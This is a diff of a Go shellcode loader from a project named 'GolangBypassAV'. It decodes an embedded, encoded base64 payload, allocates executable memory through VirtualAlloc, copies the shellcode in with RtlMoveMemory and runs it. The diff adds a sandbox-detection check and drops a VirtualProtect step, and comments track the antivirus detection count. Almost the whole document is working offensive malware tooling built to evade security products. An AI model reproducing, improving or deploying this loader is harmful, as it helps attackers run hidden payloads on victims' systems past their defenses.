@@ -2,7 +2,9 @@ package main
 
 import (
 	"GolangBypassAV/encry"
+	"GolangBypassAV/sandbox"
 	"encoding/base64"
+	"fmt"
 	"os"
 	"syscall"
 	"time"
@@ -13,8 +15,6 @@ const (
 	MEM_COMMIT             = 0x1000
 	MEM_RESERVE            = 0x2000
 	PAGE_EXECUTE_READWRITE = 0x40
-	PAGE_EXECUTE           = 0x10
-	PAGE_READWRITE         = 0x04
 )
 
 var kk = []byte{0x11}
@@ -42,22 +42,11 @@ func getEnCode(data []byte) string {
 }
 
 var (
-	kernel32           = syscall.MustLoadDLL("kernel32.dll")
-	ntdll              = syscall.MustLoadDLL("ntdll.dll")
-	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
-	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
-	RtlMoveMemory      = ntdll.MustFindProc("RtlMoveMemory")
+	kernel32      = syscall.MustLoadDLL("kernel32.dll")
+	ntdll         = syscall.MustLoadDLL("ntdll.dll")
+	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
+	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
 )
-
-func virtualProtect1(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
-	//fmt.Println(1)
-	ret, _, _ := procVirtualProtect.Call(
-		uintptr(lpAddress),
-		uintptr(dwSize),
-		uintptr(flNewProtect),
-		uintptr(lpflOldProtect))
-	return ret > 0
-}
 
 func getDeCode(string2 string) []byte {
 
@@ -86,15 +75,11 @@ func checkError(err error) {
 
 func genEXE(charcode []byte) {
 
-	//申请只能读写内存
-	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
 		checkError(err)
 	}
 	gd()
-	var oldshellcodeperms uint32
-	//改成可执行
-	virtualProtect1(unsafe.Pointer(&addr), uintptr(len(charcode)), PAGE_EXECUTE, unsafe.Pointer(&oldshellcodeperms))
 
 	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
 	checkError(err)
@@ -124,17 +109,15 @@ func getFileShellCode(file string) []byte {
 func getFileShellCode1(file string) string {
 	data := encry.ReadFile(file)
 	shellCodeHex := base64Encode(data)
-	//fmt.Print(shellCodeHex)
+	fmt.Print(shellCodeHex)
 	return shellCodeHex
 }
 
 func main() {
-	//用了virtualProtect没什么明显提升，还是7个。
-	//virtualProtect传参还有点问题，待修复。
-
 	//fmt.Println(1)
 
 	//fmt.Print(getEnCode(getFileShellCode("C:\\Users\\Administrator\\Desktop\\payload.bin")))
+	sandbox.Check()
 
 	bbdata := "QFZ6VUZhVYCKUlJSUlZXY2JnU2RmZ2taXnVbfWRahWRqVnpdZnl5WnpCWnhkWoWKZlZ4YYVBgVxlZVlbZFVZUoNViXl3UlqEWlZZU4piQlNSdFl6SGdbU2Zmel1melRdYnuJWlJ1U354aXhqVIhbQnSAhlJ6UlJSUlZ6V4hZY39kUlliZlqFWlhWZF1iVFNbUnVVe2d8e0CKZlhdX1p5WlJ1a19edH1aXnRUhGJ0WVtVZlZTiGV7eHV3V15SQYh8VFZmRkFpaWpoVmRdYlRjW1J1U35iaoReZFZkXWJTiVtSdVNTeohkWmRSWWJiZ3lTaFdGa2h8V2piZ31TaHx6VUhUU1Nmh0B4aFZXa2h8el1Whn1hQEBAQGlogFJkc0ZEcmhGgXN+Z0FSVldoZGp/fmVaf4lic4FedYpqWUBKZ1pedH1aXnVbX150U19edH1TZlZXYmJzgEdnf35/QEppg3RCgVp6dFdThlRSVVJSU19edH1TZmZXY3J4X1NmZlhHZ0V+d4mHQGdHQn1zZFp/U2RVWWRkan9qZWVZW2Z+eFJSfFRWZn1bU4aGhWdde4dAQmZ6W4l8elWIQlOCVH1KWnp3V1p6dYFbiUlVQEBAQEBlZVlbZn1bU4Z6QVhYWYdAQmppUlVFaHVSYlJSZGFAYVVFZF5SYlJSR0phgUZSVlJSYHp6QEBAQF1EfUdfi15SfGtoZ3VVdWZScnpKgHJlW1eBRlOFhkaAalZfhmJzc0J5gF14a4p+QHmDemZFd0d8X0mFfWmIi31HcoJYf3mIamSIYIODX15GQGKGYXN4Z1dkf4tHSIZiRIl6ZWpJhINbdlJTZ3RDZ4pdZld/a2hGQWB6U19zRIGBc1iJeV2LZoZeVFKAakNKhXRYV0FyaFuEa2WEeGVnX1tjZFJGXXtSSFpZV3xraV+DWlVahl9URYlee2qLXXtaiF6LhHhnQ32Ga1hKRHSKU2BnVFJDXXtWSFpXdWFni2pBYIpTZnR+fXxraEZBXYtmhl5UfF9UeFJpaX9Dh0JIc2dUSF92il9ci19nQ4lFa0p+g3t6f0iKiWRkfmlnQ35ad3J6UouFglNog3VaXHRagEpaYEpBf4hpfXuLYXR7RXpKZlVqZmJTa2JKSEBZaEB+WXuJholGaEZkRohUZIFCRFViSGWIY354c1aIRVNSiFlIRWN5YXiHfHJDRYE8doRgflxXRX5KSnVnSUqFW3pZeHqEVmlaWkNBRH6Gi4ZeY4hWaH2Ee1hdYWB6X0VBfmBbd1l7Q3xkh1pHWkFKaIBHYmZ3RFV2dEZnWGGJe1lIfkOHc1Z0Z0dzQXeAg4BJVFyKdWSJWkhocoVIWn1lWGeJgXp2gUaDW35nX1mDRXVFi1pSYnNIiIVyW2hASmdaXnR+R1JSU1JSVlhFUlNSUlJWWEZiUlJSUlZYR2hcY2VGd0BnZFtfZWZBeltGQXpbSWZ6W0N8WEVSVFJSUlZ+WzxmWEdWgXJbRYdAZ2RaYVZaWmlSdV1rfnqIdVpSdGBXiFlpaWhXeWpkUmZSUlJSUmZeYYB/QERAQItWil56RUZde1ZCX4pFiV57WlJWe2NodlJOTg=="
 	shellCodeHex := getDeCode(bbdata)
